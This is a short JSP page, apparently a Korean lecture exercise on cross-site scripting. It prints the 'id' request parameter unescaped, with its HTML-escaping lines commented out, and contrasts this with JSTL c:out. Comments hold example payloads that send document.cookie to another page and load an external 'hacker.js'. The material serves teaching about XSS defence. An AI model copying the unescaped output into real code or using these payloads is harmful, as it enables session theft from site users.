<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
</head>
<body>
<% String id = request.getParameter("id");
// 서버측 코드 검증 및 필터링
//'&xxxx'l;
// html 태그 < '&lt;' 표현
// < > ( ) & " '
/* id = id.replaceAll("&", "&amp;");
id = id.replaceAll("\"", "&quot;");
id = id.replaceAll("'", "&#x27;");
id = id.replaceAll("<", "&lt;");
id = id.replaceAll(">", "&gt;"); */
//id.replaceAll("(", "&#x28;");
//id.replaceAll(")", "&#x29;");


 %>



<%=id %><br>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<c:out value="${param.id }"><br>
<%-- <% contents - (<script>location.href='...?cookie=' + document.cookie<script>) 
해당 글 클릭 사용자 모두에게 피해 발생
%> --%>
<%-- 글읽기 <%= contents %>
굴읽기 <c:out value="<%= contents %>"> --%>
<!-- <script>
//Cookie / HttpSession(서버측저장정보-클라이언트 접근)
location.href="/a.html?cookie=" + document.cookie;
</script> -->

<!-- http...?id=<script src='hacker.js'></script> -->
</body>
</html>